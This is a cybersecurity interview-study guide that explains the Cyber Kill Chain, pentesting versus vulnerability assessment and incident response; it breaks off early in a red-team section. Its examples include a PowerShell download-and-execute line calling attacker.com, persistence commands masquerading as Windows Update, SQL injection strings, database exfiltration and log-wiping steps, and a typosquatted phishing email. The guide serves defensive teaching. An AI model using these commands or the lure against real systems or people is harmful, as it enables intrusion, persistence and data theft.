# Interview Preparation: Security Processes & Frameworks

> **Purpose**: Master security frameworks, processes, and team structures for cybersecurity interviews. Covers Cyber Kill Chain, Penetration Testing vs Vulnerability Assessment, Incident Response, Red/Blue/Purple Teams, Threat Intelligence, and security methodologies.

**What You'll Master**:
- Cyber Kill Chain - all 7 stages with real examples
- Penetration Testing vs Vulnerability Assessment - critical differences
- Incident Response - NIST framework, phases, playbooks
- Red Team vs Blue Team vs Purple Team - roles and operations
- Threat Intelligence - collection, analysis, sharing
- MITRE ATT&CK Framework - tactics and techniques
- Security frameworks - NIST, ISO, CIS
- 120+ interview questions with detailed answers

---

## Table of Contents

1. [Cyber Kill Chain](#1-cyber-kill-chain)
2. [Penetration Testing](#2-penetration-testing)
3. [Vulnerability Assessment](#3-vulnerability-assessment)
4. [Penetration Testing vs Vulnerability Assessment](#4-penetration-testing-vs-vulnerability-assessment)
5. [Incident Response](#5-incident-response)
6. [Red Team Operations](#6-red-team-operations)
7. [Blue Team Operations](#7-blue-team-operations)
8. [Purple Team Operations](#8-purple-team-operations)
9. [Threat Intelligence](#9-threat-intelligence)
10. [MITRE ATT&CK Framework](#10-mitre-attck-framework)
11. [Security Frameworks](#11-security-frameworks)
12. [Passive vs Active Reconnaissance](#12-passive-vs-active-reconnaissance)
13. [Interview Questions & Answers](#13-interview-questions-answers)

---

## 1. Cyber Kill Chain

### 1.1 What is the Cyber Kill Chain?

**Definition**: Framework developed by Lockheed Martin describing the stages of a cyber attack from reconnaissance to objective completion.

**Purpose**:
- Understand attacker methodology
- Identify where to defend
- Break the chain (stop attack at any stage)
- Improve detection and response

**The 7 Stages**:
```
1. Reconnaissance      → Target identification and research
2. Weaponization       → Create malicious payload
3. Delivery            → Transmit weapon to target
4. Exploitation        → Execute code on victim system
5. Installation        → Install malware/backdoor
6. Command & Control   → Establish remote control
7. Actions on Objective → Achieve attack goal (data theft, destruction)
```

### 1.2 Stage 1: Reconnaissance

**Definition**: Gathering information about the target to identify vulnerabilities and plan attack.

**Types**:
- **Passive**: OSINT, public information gathering (no direct contact)
- **Active**: Direct interaction (port scanning, social engineering)

**Attacker Actions**:
```
PASSIVE RECONNAISSANCE:
├─ Google dorking (site:target.com filetype:pdf)
├─ LinkedIn (employee names, job titles, technologies used)
├─ Company website (contact info, office locations)
├─ DNS enumeration (subdomains, mail servers)
├─ WHOIS lookups (domain registration info)
├─ Shodan (exposed systems, IoT devices)
├─ Job postings ("We use MySQL, Apache, AWS")
├─ Social media (employees posting about work)
└─ Breach databases (Have I Been Pwned)

ACTIVE RECONNAISSANCE:
├─ Port scanning (Nmap)
├─ Network mapping
├─ Service enumeration
├─ Vulnerability scanning
└─ Social engineering (phishing, pretexting)
```

**Real-World Example**:
```
Target: Financial company XYZ

Reconnaissance findings:
1. LinkedIn: 500 employees, IT uses "Microsoft Stack"
2. Job posting: "Experience with SQL Server 2012 required"
   → Attacker knows: SQL Server 2012 (has known vulnerabilities)
3. Shodan: Found exposed RDP server on 203.0.113.50:3389
4. Email format: firstname.lastname@xyz.com
5. WHOIS: Domain registered 1999 (likely legacy systems)

Attacker's plan:
- Target: Outdated SQL Server
- Delivery: Phishing email to employees
- Entry point: Exposed RDP with weak password
```

**Defense**:
- Minimize public information exposure
- Monitor for reconnaissance activity (port scans)
- Security awareness training
- Threat intelligence (are we being targeted?)

### 1.3 Stage 2: Weaponization

**Definition**: Creating a malicious payload designed to exploit a specific vulnerability.

**Attacker Actions**:
```
1. Select exploit (for discovered vulnerability)
2. Create payload (what malware runs after exploit)
3. Package together (exploit + payload = weapon)
4. Encode/obfuscate (evade antivirus)

Example weapons:
├─ Malicious document (Word macro with embedded exploit)
├─ Trojanized software (legitimate app + backdoor)
├─ Exploit kit (automated exploitation framework)
└─ Phishing email with malicious attachment
```

**Real-World Example**:
```
Attacker's weapon creation:

Target: XYZ Financial (uses SQL Server 2012)
Vulnerability: CVE-2017-11882 (Office memory corruption)

Weaponization:
1. Create Word document: "Q4_Financial_Results.docx"
2. Embed exploit (CVE-2017-11882) in document
3. Payload: PowerShell script downloads Meterpreter backdoor
4. Obfuscate PowerShell (Base64 encoding)
5. Test on VirusTotal (0/70 detections ✓)
6. Weapon ready: Invoice.docx

When opened:
Invoice.docx → Exploit executes → PowerShell runs → Downloads backdoor
```

**Defense**:
- Disable macros by default
- Application whitelisting
- Email attachment filtering
- User training (don't open untrusted documents)

### 1.4 Stage 3: Delivery

**Definition**: Transmitting the weaponized payload to the target.

**Delivery Methods**:
```
EMAIL PHISHING (Most Common):
├─ Spear phishing (targeted, personalized)
├─ Whaling (targeting executives)
├─ Attachment (malicious .doc, .pdf, .exe)
└─ Link (drive-by download)

WEB-BASED:
├─ Watering hole (compromise sites target visits)
├─ Malvertising (malicious advertisements)
├─ Drive-by download (exploit kit)
└─ Compromised software update

PHYSICAL:
├─ USB drop (leave infected USB in parking lot)
├─ Hardware implants
└─ Social engineering (pose as vendor)

NETWORK:
├─ Exploit public-facing service (RDP, SSH, SMB)
├─ Supply chain attack
└─ Compromised third-party
```

**Real-World Example**:
```
Delivery: Spear Phishing

From: finance@xyzfinancia1.com (note: "1" not "l")
To: john.doe@xyzfinancial.com
Subject: URGENT: Q4 Audit Results - Review Required

John,

Please review the attached Q4 audit findings before 
tomorrow's board meeting. Let me know if you have questions.

Best regards,
Sarah Johnson
Chief Financial Officer
XYZ Financial

Attachment: Q4_Audit_Results.docx (weaponized)

Social engineering tactics:
✓ Urgency ("before tomorrow's meeting")
✓ Authority (CFO)
✓ Legitimacy (looks official)
✓ Personalization (employee name)
✓ Typosquatting domain (xyzfinancia1.com vs xyzfinancial.com)
```

**Defense**:
- Email filtering (SPF, DKIM, DMARC)
- Email gateway (Proofpoint, Mimecast)
- Link protection (rewrite URLs, sandbox)
- User awareness training
- Visual indicators (external sender warnings)

### 1.5 Stage 4: Exploitation

**Definition**: Triggering the exploit to execute attacker's code on victim system.

**Exploitation Triggers**:
```
USER-INITIATED:
├─ User opens malicious document
├─ User clicks malicious link
├─ User enables macros
└─ User runs executable

AUTOMATIC:
├─ Drive-by download (browser exploit)
├─ Worm propagation (network exploit)
├─ Zero-click exploit (no user action)
└─ Software vulnerability
```

**Real-World Example**:
```
Exploitation sequence:

1. John opens Q4_Audit_Results.docx
2. Word prompts: "Enable Editing" (John clicks)
3. CVE-2017-11882 exploit executes
4. Exploit bypasses DEP (Data Execution Prevention)
5. Exploit gains code execution (SYSTEM privileges)
6. Exploit executes PowerShell command:
   powershell -enc <Base64_encoded_payload>
7. PowerShell decodes and executes:
   IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')
8. Downloads second-stage payload
9. Execution successful ✓
```

**Defense**:
- Patch management (update software)
- Exploit protection (Windows Defender Exploit Guard)
- Antivirus/EDR
- Application sandboxing
- Principle of least privilege

### 1.6 Stage 5: Installation

**Definition**: Installing malware, backdoor, or persistence mechanism on victim system.

**Installation Methods**:
```
PERSISTENCE MECHANISMS:
├─ Registry Run keys (HKLM\...\Run)
├─ Scheduled tasks
├─ Windows services
├─ DLL hijacking
├─ WMI event subscriptions
├─ Startup folder
└─ Account creation (hidden admin)

MALWARE INSTALLATION:
├─ Dropper downloads main payload
├─ RAT (Remote Access Trojan)
├─ Keylogger
├─ Credential stealer
└─ Ransomware (later stage)
```

**Real-World Example**:
```
Installation phase:

PowerShell payload:
1. Downloads Cobalt Strike beacon → C:\Windows\Temp\svchost.exe
2. Creates scheduled task:
   schtasks /create /tn "Windows Update" /tr "C:\Windows\Temp\svchost.exe" 
   /sc onlogon /ru SYSTEM
3. Adds registry key (redundant persistence):
   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   "WindowsUpdate" = "C:\Windows\Temp\svchost.exe"
4. Creates Windows service:
   sc create "WinUpdate" binPath= "C:\Windows\Temp\svchost.exe" start= auto
5. Starts service:
   sc start WinUpdate
6. Establishes connection to C&C server

Result: Malware runs on every boot (3 persistence mechanisms)
```

**Defense**:
- Endpoint Detection and Response (EDR)
- File Integrity Monitoring (FIM)
- Application whitelisting
- Monitor autorun locations
- Behavioral analysis

### 1.7 Stage 6: Command and Control (C2)

**Definition**: Establishing communication channel between compromised system and attacker's server.

**C2 Techniques**:
```
PROTOCOLS:
├─ HTTP/HTTPS (blends with normal traffic)
├─ DNS tunneling (C2 over DNS queries)
├─ ICMP tunneling (C2 over ping)
├─ Cloud services (Google Drive, Dropbox for C2)
└─ Social media (Twitter, Reddit for commands)

TECHNIQUES:
├─ Domain Generation Algorithm (DGA) - generate C2 domains
├─ Fast Flux - rapidly changing IPs
├─ Tor/I2P (anonymity)
└─ Encrypted communication
```

**Real-World Example**:
```
C2 Communication:

Malware: Cobalt Strike beacon
C2 Server: attacker-c2.com (hosted in compromised cloud server)

Communication flow:
1. Beacon → HTTPS GET request to attacker-c2.com/updates
   (Appears as: "Checking for Windows updates")
2. C2 Server → Encrypted response with commands:
   - "Execute: whoami /all"
   - "Download: mimikatz.exe"
   - "Lateral move: 192.168.1.50"
3. Beacon executes commands
4. Beacon → Sends results back to C2
5. Heartbeat: Every 60 seconds (check for new commands)

Evasion:
✓ Uses HTTPS (encrypted, looks legitimate)
✓ User-Agent: "Mozilla/5.0..." (mimics browser)
✓ Jitter: Random delays (avoid pattern detection)
✓ Domain fronting: Appear to access legitimate site (Google)
```

**Defense**:
- Network monitoring (unusual outbound connections)
- Firewall rules (whitelist allowed destinations)
- DNS filtering (block known malicious domains)
- Threat intelligence (IOCs for C2 domains/IPs)
- SSL/TLS inspection

### 1.8 Stage 7: Actions on Objectives

**Definition**: Achieving the attacker's ultimate goal (data theft, destruction, espionage, disruption).

**Common Objectives**:
```
DATA THEFT:
├─ Intellectual property (trade secrets, source code)
├─ Customer data (PII, credit cards)
├─ Financial data (bank accounts, transactions)
├─ Credentials (passwords, tokens)
└─ Email exfiltration

DESTRUCTIVE:
├─ Ransomware deployment
├─ Data wiping
├─ Sabotage (Stuxnet destroying centrifuges)
└─ DDoS amplification

ESPIONAGE:
├─ Long-term monitoring
├─ Keylogging
├─ Screen capture
└─ Email surveillance

FINANCIAL:
├─ Wire transfer fraud
├─ Cryptocurrency theft
├─ Business Email Compromise (BEC)
└─ ATM jackpotting
```

**Real-World Example**:
```
Actions on Objectives: Data Exfiltration

Attacker's goal: Steal customer database

Steps:
1. Enumerate network (discover database server: 192.168.1.100)
2. Lateral movement (use compromised credentials)
3. Access database server
4. Locate database: CustomerDB
5. Extract data:
   mysqldump -u admin -p CustomerDB > customers.sql
6. Compress: tar -czf data.tar.gz customers.sql
7. Encrypt: openssl enc -aes-256-cbc -in data.tar.gz -out data.enc
8. Exfiltrate:
   - Split into small chunks (evade DLP detection)
   - Upload to Dropbox (normal HTTPS traffic)
   - Alternative: DNS exfiltration (stealth)
9. Clean up:
   - Delete logs
   - Remove tools
   - Maintain backdoor (future access)

Result: 2 million customer records stolen (PII, emails, passwords)
```

**Defense**:
- Data Loss Prevention (DLP)
- Network segmentation (limit lateral movement)
- Database activity monitoring
- Encryption at rest
- Access logging and alerting
- Principle of least privilege

### 1.9 Breaking the Kill Chain

**Defense Strategy**: Disrupt attack at any stage to prevent success.

```
┌─────────────────────────────────────────────────────────┐
│         DEFENSIVE MEASURES BY STAGE                     │
│                                                         │
│  1. RECONNAISSANCE                                      │
│     ├─ Minimize public exposure                        │
│     ├─ Monitor for port scans                          │
│     ├─ Threat intelligence                             │
│     └─ Honeypots (detect scanning)                     │
│                                                         │
│  2. WEAPONIZATION                                       │
│     ├─ Threat intelligence (known exploits)            │
│     ├─ Patch vulnerabilities                           │
│     └─ Reduce attack surface                           │
│                                                         │
│  3. DELIVERY                                            │
│     ├─ Email filtering (SPF/DKIM/DMARC)                │
│     ├─ Web filtering                                   │
│     ├─ User awareness training                         │
│     └─ Attachment sandboxing                           │
│                                                         │
│  4. EXPLOITATION                                        │
│     ├─ Patch management                                │
│     ├─ Exploit protection (EMET, WDEG)                 │
│     ├─ Antivirus/EDR                                   │
│     └─ Application whitelisting                        │
│                                                         │
│  5. INSTALLATION                                        │
│     ├─ EDR behavioral detection                        │
│     ├─ File Integrity Monitoring                       │
│     ├─ Application control                             │
│     └─ Privilege restriction                           │
│                                                         │
│  6. COMMAND & CONTROL                                   │
│     ├─ Network monitoring (IDS/IPS)                    │
│     ├─ Firewall egress filtering                       │
│     ├─ DNS filtering                                   │
│     └─ Proxy with SSL inspection                       │
│                                                         │
│  7. ACTIONS ON OBJECTIVES                               │
│     ├─ Data Loss Prevention (DLP)                      │
│     ├─ Network segmentation                            │
│     ├─ Database activity monitoring                    │
│     ├─ Incident response                               │
│     └─ Backups (ransomware resilience)                 │
└─────────────────────────────────────────────────────────┘

Key principle: Defense in depth
If one layer fails, others still protect
```

---

## 2. Penetration Testing

### 2.1 What is Penetration Testing?

**Definition**: Authorized simulated cyber attack to evaluate security posture by identifying and exploiting vulnerabilities.

**Purpose**:
- Find vulnerabilities before attackers do
- Validate security controls
- Test incident response
- Compliance requirements (PCI-DSS)
- Risk assessment

**Key Characteristics**:
- ✅ **Active**: Exploits vulnerabilities
- ✅ **Manual**: Skilled testers, not just automated tools
- ✅ **Deep**: Attempts to achieve objectives (access data, privilege escalation)
- ✅ **Authorized**: Written permission required
- ✅ **Documented**: Detailed report with recommendations

### 2.2 Penetration Testing Phases

**Phase 1: Planning and Reconnaissance**
```
Scope definition:
- What systems are in scope? (IP ranges, domains, applications)
- What is out of scope? (production databases, third-party systems)
- Testing window (nights/weekends to minimize disruption?)
- Rules of engagement (DoS allowed? Social engineering?)
- Emergency contacts

Information gathering:
- OSINT (public information)
- Passive reconnaissance
- Technology fingerprinting
```

**Phase 2: Scanning**
```
Port scanning:
- Nmap (find open ports, services)
- Service version detection
- OS fingerprinting

Vulnerability scanning:
- Nessus/OpenVAS (identify CVEs)
- Web scanner (Nikto, Burp)
- Misconfigurations

Network mapping:
- Topology discovery
- Identify targets
- Prioritize systems
```

**Phase 3: Gaining Access (Exploitation)**
```
Exploit vulnerabilities:
- Metasploit Framework
- Custom exploits
- Social engineering
- Password attacks

Goal: Initial foothold
- Web shell on web server
- Reverse shell on workstation
- VPN access
- Compromised credentials
```

**Phase 4: Maintaining Access**
```
Persistence mechanisms:
- Backdoors
- Additional user accounts
- Scheduled tasks
- Rootkits

Goal: Simulate APT (remain undetected)
```

**Phase 5: Analysis and Reporting**
```
Documentation:
- Executive summary (business impact)
- Technical findings (CVE details, CVSS scores)
- Exploitation steps (proof of concept)
- Remediation recommendations
- Risk ratings (Critical, High, Medium, Low)

Deliverables:
- Written report
- Presentation to stakeholders
- Remediation guidance
- Retesting (verify fixes)
```

### 2.3 Types of Penetration Testing

**By Scope**:
```
NETWORK PENETRATION TEST:
- External (internet-facing systems)
- Internal (inside the network)
- Wireless (Wi-Fi security)
- Physical (building access)

WEB APPLICATION PENETRATION TEST:
- OWASP Top 10 testing
- Authentication/authorization
- Input validation
- Session management
- API security

CLOUD PENETRATION TEST:
- AWS/Azure/GCP security
- Misconfigured S3 buckets
- IAM policy review
- Serverless security

MOBILE APPLICATION PENETRATION TEST:
- iOS/Android apps
- API communication
- Data storage
- Authentication

SOCIAL ENGINEERING:
- Phishing campaigns
- Vishing (voice phishing)
- Physical access attempts
- USB drop tests
```

**By Knowledge Level**:
```
BLACK BOX (Zero Knowledge):
├─ Tester has no prior information
├─ Mimics external attacker
├─ Most realistic scenario
└─ Time-consuming

GRAY BOX (Partial Knowledge):
├─ Tester has some information (credentials, network diagram)
├─ Mimics insider threat or compromised account
├─ Balanced approach
└─ Most common

WHITE BOX (Full Knowledge):
├─ Tester has complete information (source code, architecture)
├─ Thorough testing
├─ Code review included
└─ Time-efficient
```

### 2.4 Penetration Testing Methodology

**PTES (Penetration Testing Execution Standard)**:
```
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting
```

**OWASP Testing Guide** (Web Apps):
```
1. Information Gathering
2. Configuration Management Testing
3. Identity Management Testing
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. Input Validation Testing
8. Error Handling
9. Cryptography
10. Business Logic Testing
11. Client-Side Testing
```

### 2.5 Penetration Testing Report Example

```
PENETRATION TEST REPORT
Client: XYZ Corporation
Date: February 14, 2024
Tester: ABC Security Consulting

EXECUTIVE SUMMARY:
ABC Security conducted a penetration test of XYZ Corporation's
external network and web applications. The assessment identified
several critical vulnerabilities that could allow attackers to
compromise systems and access sensitive data.

KEY FINDINGS:
- 3 Critical vulnerabilities
- 7 High vulnerabilities  
- 12 Medium vulnerabilities
- 5 Low vulnerabilities

CRITICAL FINDINGS:

1. SQL Injection in Customer Portal (CVSS 9.8 - Critical)
   Location: https://portal.xyz.com/search?id=
   Description: The application does not properly sanitize user input,
   allowing attackers to inject SQL commands and extract database contents.
   Impact: Attacker can access all customer records (PII, payment info)
   Proof of Concept:
   GET /search?id=1' UNION SELECT username,password FROM users--
   Remediation: Implement parameterized queries, input validation

2. Unauthenticated RDP Access (CVSS 9.1 - Critical)
   Location: 203.0.113.50:3389
   Description: RDP exposed to internet with weak password
   Impact: Attacker can gain full system access
   Proof of Concept: Brute-forced password "Password123" in 15 minutes
   Remediation: Disable public RDP, implement VPN, enforce MFA

[... detailed findings continue ...]
```

---

## 3. Vulnerability Assessment

### 3.1 What is Vulnerability Assessment?

**Definition**: Systematic review of security weaknesses in systems, identifying and quantifying vulnerabilities without exploiting them.

**Purpose**:
- Inventory assets
- Identify known vulnerabilities (CVEs)
- Prioritize patching
- Compliance verification
- Risk measurement

**Key Characteristics**:
- ✅ **Passive**: Identifies vulnerabilities without exploiting
- ✅ **Automated**: Primarily scanner-based
- ✅ **Broad**: Scans all systems in scope
- ✅ **Regular**: Performed periodically (monthly, quarterly)
- ✅ **Quantified**: CVSS scores, risk ratings

### 3.2 Vulnerability Assessment Process

**1. Asset Discovery**
```
Identify all systems:
- IP addresses (network scan)
- Hostnames
- Operating systems
- Installed software
- Services running
- Open ports

Output: Asset inventory
```

**2. Vulnerability Scanning**
```
Automated scanning:
- Nessus, OpenVAS, Qualys
- CVE database lookup
- Misconfigurations
- Weak passwords
- Missing patches
- SSL/TLS issues

Output: List of vulnerabilities with CVSS scores
```

**3. Analysis and Prioritization**
```
Risk assessment:
- CVSS base score (0-10)
- Exploitability (is exploit available?)
- Asset criticality (production vs dev?)
- Exposure (internet-facing vs internal?)
- Context (compensating controls?)

Prioritization:
Critical (CVSS 9.0-10.0) + Internet-facing = Patch NOW
High (7.0-8.9) + Internal = Patch within 30 days
Medium (4.0-6.9) = Patch within 90 days
Low (0.0-3.9) = Patch when convenient
```

**4. Reporting**
```
Vulnerability report:
- Total vulnerabilities found
- Breakdown by severity
- Top 10 critical issues
- Remediation recommendations
- Trend analysis (improving or worsening?)
```

**5. Remediation Tracking**
```
Patch management:
- Assign owners
- Set deadlines (based on severity)
- Track progress
- Verify fixes (re-scan)
```

### 3.3 Vulnerability Assessment vs Penetration Testing (Summary)

We'll cover the detailed comparison in the next section, but key difference:

**Vulnerability Assessment**: "Here are the unlocked doors" (identification)
**Penetration Testing**: "I walked through the unlocked doors and reached the safe" (exploitation + impact)

---

## 4. Penetration Testing vs Vulnerability Assessment

### 4.1 Detailed Comparison

| Aspect | Vulnerability Assessment | Penetration Testing |
|--------|-------------------------|---------------------|
| **Objective** | Identify vulnerabilities | Exploit vulnerabilities + achieve objectives |
| **Approach** | Automated scanning + manual validation | Manual testing + exploitation |
| **Depth** | Broad (scan everything) | Deep (exploit specific targets) |
| **Tools** | Scanners (Nessus, OpenVAS, Qualys) | Exploitation tools (Metasploit, Burp, custom exploits) |
| **Output** | List of CVEs with CVSS scores | Proof of compromise, data accessed, privilege gained |
| **Exploitation** | No (identifies but doesn't exploit) | Yes (actively exploits vulnerabilities) |
| **Risk** | Low (non-intrusive) | Medium-High (could cause outages) |
| **Frequency** | Regular (monthly, quarterly) | Periodic (annually, after major changes) |
| **Time** | Hours to days | Days to weeks |
| **Cost** | Lower ($5k-$20k) | Higher ($20k-$100k+) |
| **Skill Level** | Moderate (scanner operation) | High (manual exploitation, lateral movement) |
| **Report** | Vulnerability list + remediation | Attack narrative + business impact + remediation |
| **False Positives** | Higher (scanner limitations) | Lower (manual verification) |
| **Compliance** | PCI-DSS quarterly scans | PCI-DSS annual penetration test |
| **Example Finding** | "SQL injection vulnerability exists" | "Exploited SQL injection, dumped database, accessed 100k credit cards" |

### 4.2 When to Use Each

**Use Vulnerability Assessment When**:
```
✅ Regular security hygiene (monthly/quarterly scans)
✅ Compliance requirements (PCI-DSS quarterly scans)
✅ Patch management validation
✅ Asset inventory needed
✅ Budget constrained
✅ Internal security team can remediate findings
```

**Use Penetration Testing When**:
```
✅ Annual security validation
✅ New application/system launch
✅ Post-breach assessment
✅ Regulatory requirement (PCI-DSS annual)
✅ M&A due diligence
✅ Red team exercise
✅ Testing incident response capabilities
```

**Best Practice**: Use Both
```
Quarterly: Vulnerability assessments (continuous monitoring)
Annually: Penetration test (validate real-world exploitability)
Ad-hoc: Penetration test after major changes
```

### 4.3 Real-World Example Comparison

**Scenario: Web Application Security**

**Vulnerability Assessment Findings**:
```
Scanner: Nessus
Target: https://webapp.example.com

Findings:
1. SQL Injection - /search parameter (CVSS 9.8 - Critical)
   Evidence: Scanner detected error message revealing database structure
   
2. Cross-Site Scripting - /comment parameter (CVSS 6.1 - Medium)
   Evidence: Scanner successfully injected <script> tag
   
3. Outdated jQuery library 1.8.3 (CVSS 6.9 - Medium)
   Evidence: Version detection
   
4. Missing security headers (CVSS 4.3 - Medium)
   Evidence: No X-Frame-Options, CSP headers

Remediation:
- Implement parameterized queries
- Sanitize user input
- Update JavaScript libraries
- Add security headers
```

**Penetration Test Findings**:
```
Tester: Senior penetration tester
Target: https://webapp.example.com
Time: 3 days

Attack Chain:
1. Day 1: Discovered SQL injection in /search parameter
   - Manually confirmed with: ' OR 1=1--
   - Identified database: MySQL 5.7
   - Enumerated tables: users, orders, payments
   
2. Day 2: Exploited SQL injection
   - Extracted admin credentials:
     username: admin
     password: $2a$10$... (bcrypt hash)
   - Cracked hash offline: "Admin@2023"
   - Logged in as administrator
   
3. Day 3: Post-exploitation
   - Accessed admin panel
   - Downloaded customer database (50,000 records)
   - Uploaded web shell (backdoor for persistent access)
   - Lateral movement: Accessed database server via weak SSH password
   - Escalated privileges: sudo vulnerability (CVE-2021-3156)
   - Root access achieved on database server
   
Impact:
- Complete compromise of web application
- Access to 50,000 customer records (PII, payment info)
- Root access to backend database server
- Persistent backdoor installed
- Could delete/modify data, cause business disruption

Remediation (prioritized by impact):
CRITICAL:
1. Fix SQL injection (immediate)
2. Rotate admin credentials
3. Remove web shell
4. Patch sudo vulnerability
5. Review all admin accounts

HIGH:
6. Implement Web Application Firewall (WAF)
7. Enforce strong password policy
8. Implement multi-factor authentication
9. Network segmentation (isolate database)
10. Database activity monitoring
```

**Key Difference**:
- VA: "SQL injection exists" (surface-level)
- PT: "I exploited SQL injection, became admin, accessed 50k records, and gained root on database server" (real impact)

---

## 5. Incident Response

### 5.1 What is Incident Response?

**Definition**: Organized approach to addressing and managing security incidents (breach, attack, data leak) to minimize damage and recovery time.

**Goals**:
- Contain incident quickly
- Eradicate threat
- Recover normal operations
- Prevent recurrence
- Fulfill legal/regulatory obligations
- Learn and improve

### 5.2 Incident Response Frameworks

**NIST SP 800-61** (Most Common):
```
1. Preparation
2. Detection and Analysis
3. Containment, Eradication, and Recovery
4. Post-Incident Activity
```

**SANS 6-Step Process**:
```
1. Preparation
2. Identification
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned
```

### 5.3 Incident Response Phases (NIST)

**Phase 1: Preparation**
```
Before incident occurs:

PEOPLE:
├─ Incident Response Team (IRT)
│   ├─ IR Manager (coordinates response)
│   ├─ Security analysts (investigate)
│   ├─ IT staff (remediation)
│   ├─ Legal counsel
│   ├─ PR/Communications
│   └─ Management (decisions)
├─ Training and drills (tabletop exercises)
└─ On-call rotation

PROCESS:
├─ Incident Response Plan (IRP)
├─ Incident classification (severity levels)
├─ Escalation procedures
├─ Communication plan
├─ Legal/regulatory requirements (breach notification laws)
└─ Playbooks (ransomware, data breach, DDoS)

TECHNOLOGY:
├─ Monitoring tools (SIEM, EDR, IDS/IPS)
├─ Forensic tools (Volatility, FTK, Wireshark)
├─ Incident tracking (ticketing system)
├─ Secure communication (encrypted chat)
├─ Evidence storage (forensic workstation, write blockers)
└─ Backup and recovery systems
```

**Phase 2: Detection and Analysis**
```
Identify and investigate incidents:

DETECTION SOURCES:
├─ SIEM alerts (correlation rules triggered)
├─ IDS/IPS alerts (network intrusion detected)
├─ EDR alerts (malware, suspicious process)
├─ User reports ("My computer is slow", "Strange email")
├─ Antivirus alerts
├─ Log analysis (unusual authentication, failed logins)
└─ External notification (FBI, threat intel, vendor)

INITIAL ANALYSIS:
1. Triage (is this a real incident or false positive?)
2. Classify severity:
   - P1 (Critical): Active data breach, ransomware
   - P2 (High): Malware infection, unauthorized access
   - P3 (Medium): Suspicious activity, policy violation
   - P4 (Low): Isolated incident, no impact
3. Scope determination:
   - How many systems affected?
   - What data is at risk?
   - Is attacker still active?
4. Evidence collection:
   - Preserve logs
   - Memory dumps
   - Disk images
   - Network captures
5. Timeline reconstruction:
   - When did breach start?
   - What was initial vector?
   - What actions has attacker taken?
```

**Phase 3: Containment, Eradication, and Recovery**
```
CONTAINMENT (Stop the bleeding):

SHORT-TERM:
├─ Network isolation (disconnect infected systems)
├─ Block malicious IPs/domains (firewall, DNS)
├─ Disable compromised accounts
├─ Take systems offline (if necessary)
└─ Implement emergency firewall rules

LONG-TERM:
├─ Network segmentation (prevent lateral movement)
├─ Patch vulnerabilities (close entry point)
├─ Deploy additional monitoring
└─ Change passwords (compromised credentials)

ERADICATION (Remove the threat):
├─ Remove malware (all infected systems)
├─ Delete backdoors (persistence mechanisms)
├─ Close vulnerabilities (patch, config changes)
├─ Reset compromised credentials
└─ Remove attacker access (revoke tokens, certificates)

RECOVERY (Return to normal):
├─ Restore from clean backups
├─ Rebuild compromised systems (from scratch)
├─ Verify systems clean (scan with multiple tools)
├─ Monitor closely (watch for reinfection)
├─ Gradual return to production
└─ Enhanced monitoring (increased logging, alerting)
```

**Phase 4: Post-Incident Activity**
```
LESSONS LEARNED (Within 2 weeks of incident):
├─ Meeting with all stakeholders
├─ What happened? (root cause analysis)
├─ What went well?
├─ What could be improved?
├─ Were procedures followed?
├─ Were tools adequate?
└─ Action items (update IRP, implement new controls)

DOCUMENTATION:
├─ Incident report (timeline, impact, response actions)
├─ Root cause analysis
├─ Cost calculation (downtime, remediation, notification)
├─ Regulatory notifications (if required)
└─ Legal hold (preserve evidence for potential litigation)

IMPROVEMENTS:
├─ Update Incident Response Plan
├─ Implement new security controls
├─ Additional training
├─ New tools/technologies
└─ Policy updates
```

### 5.4 Incident Response Playbooks

**Ransomware Playbook Example**:
```
RANSOMWARE INCIDENT RESPONSE

DETECTION:
- Alert: Mass file encryption detected (EDR)
- User report: Files encrypted, ransom note displayed

IMMEDIATE ACTIONS (First 15 minutes):
1. Isolate infected system(s) from network
   - Disable network adapter OR disconnect cable
   - Do NOT power off (may lose evidence in RAM)
2. Identify patient zero (first infected system)
3. Alert IR team (page on-call)
4. Preserve ransom note (screenshot, file copy)
5. Block ransomware C&C IPs (firewall)

CONTAINMENT (First hour):
1. Identify all infected systems (SIEM correlation)
2. Network-wide isolation (segment infected subnet)
3. Disable remote access (VPN, RDP) if infection vector
4. Reset passwords (Active Directory, VPN, email)
5. Block file shares (prevent further encryption)

INVESTIGATION (First 4 hours):
1. Determine ransomware variant (check ID Ransomware)
2. Is decryption possible? (Check No More Ransom Project)
3. Identify infection vector:
   - Phishing email?
   - RDP brute force?
   - Vulnerability exploit?
4. Timeline reconstruction (when did encryption start?)
5. Scope assessment (what data is encrypted?)

ERADICATION (First 8 hours):
1. Remove ransomware (all infected systems)
2. Wipe and reimage infected systems (safest approach)
3. Scan entire network (ensure no lingering malware)
4. Close infection vector (patch, disable RDP, etc.)

RECOVERY (Day 1-3):
1. Restore from backups:
   - Verify backup integrity (not encrypted)
   - Restore to clean systems
   - Test restored data
2. Rebuild systems from scratch (gold images)
3. Gradual production return
4. Monitor for reinfection

DECISION: Pay ransom?
- Default answer: NO
- Consult: Legal, management, law enforcement (FBI)
- Consider:
  - Do we have backups?
  - Is data critical (human lives at risk)?
  - Paying funds criminal organizations
  - No guarantee of decryption

POST-INCIDENT:
1. Lessons learned meeting
2. Improve backups (3-2-1 rule, offline backups)
3. Implement EDR (if not present)
4. User training (phishing awareness)
5. Disable unnecessary RDP
6. Network segmentation
7. Incident report for board
```

### 5.5 Incident Severity Classification

```
P1 - CRITICAL (Immediate response required):
├─ Active data breach in progress
├─ Ransomware outbreak
├─ Compromise of critical system (payment processing, etc.)
├─ Malware on mission-critical server
├─ Public disclosure of breach
└─ Response: All hands on deck, 24/7 response

P2 - HIGH (Response within 2 hours):
├─ Malware on user workstation
├─ Unauthorized access to non-critical system
├─ Phishing campaign targeting organization
├─ DDoS attack (partial service degradation)
└─ Response: Dedicated IR team, business hours + on-call

P3 - MEDIUM (Response within 8 hours):
├─ Suspicious activity (potential false positive)
├─ Policy violation (USB usage, unauthorized software)
├─ Isolated spam/phishing email
└─ Response: IR analyst investigation, business hours

P4 - LOW (Response within 24 hours):
├─ Informational alerts
├─ Routine security events
└─ Response: Logged for analysis, no immediate action
```

---

## 6. Red Team Operations

### 6.1 What is Red Team?

**Definition**: Authorized group that simulates real-world adversary tactics, techniques, and procedures (TTPs) to test an organization's defenses.

**Purpose**:
- Test detection and response capabilities
- Validate security controls
- Identify gaps in defenses
